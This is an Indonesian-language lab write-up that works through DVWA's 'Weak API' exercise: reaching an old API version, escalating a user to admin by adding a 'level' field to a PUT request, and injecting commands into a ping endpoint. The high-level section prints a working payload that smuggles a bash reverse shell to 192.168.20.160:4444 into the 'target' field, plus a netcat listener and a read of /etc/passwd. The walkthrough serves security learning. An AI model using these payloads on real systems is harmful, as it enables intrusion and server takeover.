## INTRO

### Apa itu API?

API (Application Programming Interface) adalah antarmuka yang memungkinkan komunikasi antara aplikasi atau sistem yang berbeda. Dalam konteks web, API adalah mekanisme yang memungkinkan aplikasi web untuk berinteraksi dengan server, mengambil data, atau melakukan operasi tertentu tanpa perlu memuat ulang seluruh halaman.

**Karakteristik API modern:**

- **RESTful API**: Menggunakan HTTP methods (GET, POST, PUT, DELETE) untuk operasi CRUD
- **JSON Format**: Data dikirim dan diterima dalam format JSON
- **Stateless**: Setiap request berdiri sendiri tanpa menyimpan session di server
- **Endpoint**: URL khusus yang menerima request (contoh: /api/v1/users)

### Mengapa API Rentan?

API sering kali menjadi target serangan karena beberapa alasan:

- Developer tidak selalu memvalidasi data yang diterima dari client, membuka pintu untuk injection attacks
- Token atau session management yang tidak aman memungkinkan attacker mengakses data tanpa otorisasi
- API tidak memeriksa apakah user memiliki hak akses untuk melakukan operasi tertentu
- API menerima parameter yang tidak seharusnya dapat diubah oleh user
- Versi lama API masih aktif dengan kerentanan yang sudah diperbaiki di versi baru
- API mengembalikan data sensitif yang seharusnya tidak terekspos
- Input user dieksekusi sebagai system command tanpa sanitasi

### Dampak Eksploitasi API

Eksploitasi kerentanan API dapat menimbulkan dampak serius:

- Akses tidak sah ke data sensitif seperti password hash, informasi pribadi user, atau data bisnis rahasia
- User biasa dapat meningkatkan privilege menjadi admin dan mengontrol seluruh sistem
- Attacker dapat mengubah, menghapus, atau menambah data tanpa otorisasi
- Dalam kasus command injection, attacker dapat menjalankan arbitrary commands di server
- Kontrol penuh atas server dan infrastruktur aplikasi
- Kehilangan kepercayaan user dan kerugian finansial akibat security breach

## Percobaan Serangan Di DVWA

### LEVEL LOW

Level Low mengeksploitasi kerentanan **API Versioning**. Aplikasi menjalankan beberapa versi API secara bersamaan, tetapi versi lama (v1) masih aktif dan mengandung kerentanan information disclosure. Versi baru (v2) sudah memperbaiki masalah ini, namun karena versi lama tidak di-deprecate, attacker dapat mengakses endpoint lama untuk mendapatkan data sensitif.


```javascript
function get_users() {
    const url = '" . $stripped_url . "/vulnerabilities/api/v2/user/';
     
    fetch(url, { 
            method: 'GET',
        }) 
        .then(response => { 
            if (!response.ok) { 
                throw new Error('Network response was not ok'); 
        } 
        return response.json(); 
        }) 
        .then(data => { 
            loadTableData(data);
        }) 
        .catch(error => { 
            console.error('There was a problem with your fetch operation:', error); 
    }); 
}
```

Kode ini menggunakan endpoint versi 2 (`/api/v2/user/`), namun tidak ada validasi atau pembatasan akses ke versi sebelumnya. User dapat secara manual mengakses `/api/v1/user/` yang mungkin mengandung kerentanan.

Untuk cara eksploitasinya kita bisa buka browser dan akses url :


```
http://localhost/vulnerabilities/api/
```

### LEVEL MEDIUM

Di level medium, tujuan utama kita adalah menaikkan privilege user dari level user (1) ke admin (0) menggunakan mass assignment. Bisa dilihat bahwa halaman Medium Level menampilkan form untuk mengubah nama user.

![Gamabar_weak_Api](assets/image/2026-02-13-weak-api/image4.png)

Dari kode level medium, ada dua function penting:
+ get_user() untuk GET request ke /vulnerabilities/api/v2/user/2
+ update_name() untuk PUT request ke endpoint yang sama

Dan pada function `update_name` memiliki kerentanan dimana tidak ada validasi parameter yang dikirim.

```php
// Tidak ada validasi parameter yang dikirim
fetch(url, { 
    method: 'PUT',
    headers: { 
        'Content-Type': 'application/json' 
    }, 
    body: data  // Data bisa dimanipulasi
})
```

Kita juga diberi tahu bahwa ada perbedaan anatara UserUpdate dan UserAdd

+ UserUpdate (yang digunakan):

```yaml
UserUpdate:
  required:
    - name
  properties:
    name:
      type: string
```

+ UserAdd (dengan parameter tambahan):

```yaml
UserAdd:
  required:
    - level
    - name
  properties:
    name:
      type: string
    level:
      type: integer
```

untuk eksploitasinya kita menggunakan Intercept Proxy (Burp Suite)

Pertama kita buka Burp Suite dan aktifkan intercept untuk request PUT. selanjutnya lakukan submit form dengan nama baru

![Gamabar_weak_Api](assets/image/2026-02-13-weak-api/image5.png)

**Request asli:**

```json
{
  "name": "test"
}
```

**Modifikasi body request:**

```json
{
  "name": "hacked",
  "level": 0
}
```

![Gamabar_weak_Api](assets/image/2026-02-13-weak-api/image6.png)

Setelah request berhasil, halaman akan menampilkan pesan sukses dan level user berubah menjadi admin.

![Gamabar_weak_Api](assets/image/2026-02-13-weak-api/image7.png)

Jadi kerentanan mass assignment terjadi karena server tidak memvalidasi parameter yang dikirim. Endpoint PUT untuk update user seharusnya hanya menerima parameter name, tapi ternyata juga menerima parameter level yang seharusnya tidak bisa diubah oleh user biasa.

### LEVEL HIGH

Jadi di level high ini, kita diberikan halaman web seperti berikut. Di halaman tersebut, kita bisa mendownload file OpenAPI document yang berisi dokumentasi lengkap tentang endpoint-endpoint API yang tersedia. Saya menggunakan Postman untuk menganalisis API ini karena lebih mudah untuk melakukan testing dan modifikasi request.

![Screenshot halaman high level](assets/image/2026-02-13-weak-api/image8.png)

Setelah mendownload file `openapi.yml`, saya import ke Postman. File ini berisi daftar endpoint yang bisa kita gunakan, termasuk endpoint untuk health check, user management, orders, dan login.

![Screenshot import openapi ke postman](assets/image/2026-02-13-weak-api/image9.png)

Disana ada satu endpoint yaitu `/health/connectivity` digunakan untuk test ping konektivitas ke suatu host. Dari dokumentasinya, kita bisa menambahkan parameter `target` untuk menentukan host mana yang ingin di-ping.

![Screenshot endpoint connectivity](assets/image/2026-02-13-weak-api/image10.png)

Karena fungsinya untuk melakukan ping dari sistem server, artinya server akan menjalankan system command `ping` dengan parameter yang kita berikan. Ini membuka kemungkinan untuk melakukan command injection.

Dari sana, kita coba membuat parameter target dengan berbagai macam input. Pertama saya coba payload sederhana:

```json
{
    "target": "127.0.0.1 | pwd"
}
```

Penggunaan karakter pipe (`|`) itu berfungsi untuk menjalankan perintah kedua setelah perintah pertama selesai. Idealnya, jika server menjalankan perintah `ping 127.0.0.1 | pwd`, maka setelah ping selesai, perintah `pwd` akan dijalankan dan outputnya seharusnya ditampilkan ke kita.

Response dari server adalah **200 Success**, tapi tidak menampilkan hasil command injection. Hanya output ping biasa yang muncul.

![Screenshot percobaan pertama](assets/image/2026-02-13-weak-api/image11.png)

Karena output tidak langsung terlihat, kita perlu mencoba cara lain. Disini kita coba dengan **reverse shell**, teknik untuk membuat koneksi balik dari server ke mesin attacker, sehingga kita bisa mendapatkan akses shell interaktif.

Kita siapkan listener di komputer host menggunakan netcat:

```bash
nc -lvnp 4444
```

Penjelasan perintah ini:
- `nc` = netcat, tool untuk membaca/menulis koneksi network
- `-l` = listen mode (menunggu koneksi masuk)
- `-v` = verbose (menampilkan informasi detail)
- `-n` = numeric only (tidak melakukan DNS lookup)
- `-p 4444` = port yang digunakan adalah 4444

Jadi perintah ini akan membuat host kita menunggu koneksi masuk di port 4444.

![Screenshot netcat listener](assets/image/2026-02-13-weak-api/image12.png)

Selanjutnya, kita kirim request ke endpoint `/health/connectivity` dengan payload berikut:

```json
{
    "target": "localhost| echo 'bash -i >& /dev/tcp/192.168.20.160/4444 0>&1' | bash"
}
```

Penjelasan Payload :

- **`localhost|`** - Bagian ini adalah target ping yang valid, diikuti pipe untuk menjalankan perintah berikutnya
- **`echo 'bash -i >& /dev/tcp/192.168.20.160/4444 0>&1'`** - Mencetak string reverse shell
- **`| bash`** - Mengirim output echo ke bash untuk dieksekusi

String reverse shell `bash -i >& /dev/tcp/192.168.20.160/4444 0>&1` artinya:
- `bash -i` = menjalankan bash dalam mode interaktif
- `>& /dev/tcp/192.168.20.160/4444` = mengarahkan stdout dan stderr ke koneksi TCP ke IP 192.168.20.160 port 4444
- `0>&1` = mengarahkan stdin ke stdout (sehingga input dari koneksi TCP masuk ke shell)

![Screenshot payload di postman](assets/image/2026-02-13-weak-api/image13.png)

Setelah mengirim request tersebut, kita lihat terminal netcat yang tadi saya jalankan. Terlihat koneksi masuk dan kita mendapatkan shell akses ke server target.

![Screenshot reverse shell berhasil](assets/image/2026-02-13-weak-api/image14.png)

Dari sini, kita bisa menjalankan berbagai perintah di server target:
- `whoami` - mengetahui user yang menjalankan proses
- `ls -la` - melihat daftar file
- `pwd` - melihat direktori saat ini
- `cat /etc/passwd` - membaca file sensitif
- Dan lain-lain

![Screenshot menjalankan perintah](assets/image/2026-02-13-weak-api/image15.png)

## KESIMPULAN

Weak API adalah kerentanan pada API yang memungkinkan attacker untuk mengakses data sensitif, meningkatkan privilege, atau menjalankan perintah arbitrer. Kerentanan ini terjadi karena kurangnya validasi input, authenticasi yang lemah, dan authorization yang tidak tepat.

Di level Low, versi API lama yang masih aktif dapat diakses untuk mendapatkan data sensitif (password hash) yang seharusnya tidak terekspos pada versi yang lebih baru.

Di Level Medium, server tidak validasi parameter yang dikirim, sehingga attacker dapat memanipulasi parameter tambahan seperti `level` untuk melakukan privilege escalation dari user biasa menjadi admin.

Di Level High, input user pada endpoint `/health/connectivity` tidak di-sanitasi, memungkinkan attacker menjalankan arbitrary command dan mendapatkan reverse shell akses penuh ke server.
